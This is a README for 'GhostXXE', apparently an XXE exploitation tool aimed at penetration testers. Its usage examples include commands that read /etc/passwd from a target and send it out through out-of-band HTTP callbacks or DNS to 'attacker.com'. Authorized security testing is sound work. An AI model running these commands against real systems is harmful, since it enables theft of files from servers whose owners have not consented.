# GhostXXE 👻

**Advanced XML External Entity (XXE) Exploitation Framework**

A comprehensive, professional-grade XXE exploitation tool designed for penetration testing and security assessments. Built by Ghost Ops Security for real-world engagements.

[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Maintained](https://img.shields.io/badge/maintained-yes-brightgreen.svg)](https://github.com/yourusername/ghostxxe)

---

## 🎯 Features

### Core Capabilities
- ✅ **Automated XXE Discovery** - Intelligent detection of XML entity processing
- ✅ **In-Band File Reading** - Direct file exfiltration with auto-detection
- ✅ **PHP Filter Wrappers** - Base64 encoding for special character bypass
- ✅ **Out-of-Band (OOB) HTTP** - Blind XXE with automatic base64 decoding
- ✅ **Out-of-Band (OOB) DNS** - Maximum stealth exfiltration via DNS queries
- ✅ **Error-Based Exploitation** - Extract data from XML parsing errors
- ✅ **CDATA Wrapping** - Advanced file reading with special character handling
- ✅ **XSLT Injection** - Template injection testing across multiple engines
- ✅ **XPath Injection** - Query manipulation vulnerability detection

### Professional Features
- 🔧 **Burp Suite Integration** - Seamless proxy support
- 📊 **Multiple Output Formats** - JSON, HTML, and text reporting
- 🎨 **Customizable Payloads** - Extensive payload library
- 🔄 **Batch Processing** - Test multiple targets from file
- 🧵 **Multi-threading** - Concurrent scanning capabilities
- 🎯 **Smart Detection** - Auto-detects working XML structures
- 📝 **Comprehensive Logging** - Detailed output for client reports

---

## 📦 Installation

### Requirements
- Python 3.8+
- Linux/macOS/Windows

### Quick Install

```bash
# Clone repository
git clone https://github.com/yourusername/ghostxxe.git
cd ghostxxe

# Install dependencies
pip3 install -r requirements.txt

# Make executable
chmod +x ghostxxe.py

# Run
python3 ghostxxe.py --help
```

### Dependencies

```txt
requests>=2.28.0
urllib3>=1.26.0
colorama>=0.4.6
```

---

## 🚀 Quick Start

### Basic File Reading

```bash
# Test basic XXE vulnerability
python3 ghostxxe.py -u http://target.com/api -m POST -f /etc/passwd -v
```

### Comprehensive Scan

```bash
# Full vulnerability assessment
python3 ghostxxe.py -u http://target.com/api -m POST --scan -v
```

### Blind XXE (OOB HTTP)

```bash
# Out-of-band exfiltration with automatic decoding
python3 ghostxxe.py \
    -u http://target.com/api \
    -m POST \
    --oob \
    --callback-ip YOUR_IP \
    --callback-port 8000 \
    -f /etc/passwd \
    -v
```

### Blind XXE (OOB DNS)

```bash
# Maximum stealth via DNS exfiltration
python3 ghostxxe.py \
    -u http://target.com/api \
    -m POST \
    --oob-dns attacker.com \
    --callback-port 8000 \
    -f /etc/passwd \
    -v
```

---

## 📖 Full Documentation

- **[Installation Guide](https://github.com/yourusername/ghostxxe/wiki/Installation)**
- **[Usage Examples](https://github.com/yourusername/ghostxxe/wiki/Usage-Examples)**
- **[Methodology Guide](https://github.com/yourusername/ghostxxe/wiki/Methodology)**
- **[DNS OOB Guide](https://github.com/yourusername/ghostxxe/wiki/DNS-OOB-Exfiltration)**
- **[Troubleshooting](https://github.com/yourusername/ghostxxe/wiki/Troubleshooting)**

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for legitimate security testing and research. Users must:

- ✅ Obtain written authorization before testing
- ✅ Only test systems you own or have permission to test
- ✅ Comply with all applicable laws and regulations
- ✅ Use responsibly and ethically

**Unauthorized access to computer systems is illegal.** The authors assume no liability for misuse or damage caused by this tool.

---

## 📄 License

MIT License - see [LICENSE](LICENSE) file for details

---

<div align="center">

**👻 Ghost Ops Security - Where Hackers Fear to Tread 👻**

Made with ghostly intent for the security community

</div>
